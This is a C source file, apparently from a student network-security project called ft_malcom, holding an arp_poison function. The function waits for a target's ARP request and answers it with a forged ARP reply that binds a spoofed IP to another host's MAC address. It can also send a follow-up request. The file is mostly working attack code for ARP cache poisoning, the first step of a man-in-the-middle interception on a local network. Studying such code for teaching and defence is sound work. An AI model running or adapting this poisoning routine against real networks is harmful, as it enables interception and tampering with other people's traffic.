#include "../includes/ft_malcom.h"

void	arp_poison(t_malcom *mstruct)
{
	struct in_addr ipsrc, ipdst;
	t_arp_pkt pkt;

	t_sockaddr_ll send_from_addr;
	get_mac_from_ifname(&send_from_addr, mstruct->dst_host.ifa_name);

	while (TRUE) {
		if (recv_arp(&pkt, mstruct) < 0)
			continue ;

		ipsrc.s_addr = *((in_addr_t *)pkt.ar_sip);
		ipdst.s_addr = *((in_addr_t *)pkt.ar_tip);
		
		if (
			ntohs(pkt.arp_h.ar_op) == ARPOP_REQUEST
			&& !maccmp(mstruct->src_host.sock_addr_ll.sll_addr, pkt.eth_h.h_dest)
			&& mstruct->src_host.sock_addr_in.sin_addr.s_addr == ipsrc.s_addr
		)
		{
			char *macsrc = pkttos(pkt.eth_h.h_source);
			printf("An ARP request has been received.\n");
			printf("\t\e[0;1mMAC address of the request:\e[0m %s\n", macsrc);
			printf("\t\e[0;1mIP address of the request:\e[0m %s\n", inet_ntoa(ipsrc));
			free(macsrc);
			break;
		}
	}

	t_com_devices devs;

	ft_memcpy(devs.tha, pkt.ar_sha, ETH_ALEN);
	ft_memcpy(devs.tip, pkt.ar_sip, IP_ALEN);

	ft_memcpy(devs.sha, mstruct->dst_host.sock_addr_ll.sll_addr, ETH_ALEN);
	ft_memcpy(devs.sip, &(ipdst.s_addr), IP_ALEN);
	
	send_arp(ARPOP_REPLY, mstruct, &devs, &send_from_addr);

	if (mstruct->options.flags & MALC_OPT_POISON_REQBCK) {
		printf("Wait %d seconds before sending back a request...\n", REQBCK_DELAY);
		ft_sleep(REQBCK_DELAY);
		send_arp(ARPOP_REQUEST, mstruct, &devs, &send_from_addr);
		printf("ARP request sent back to target.\n");
	}
}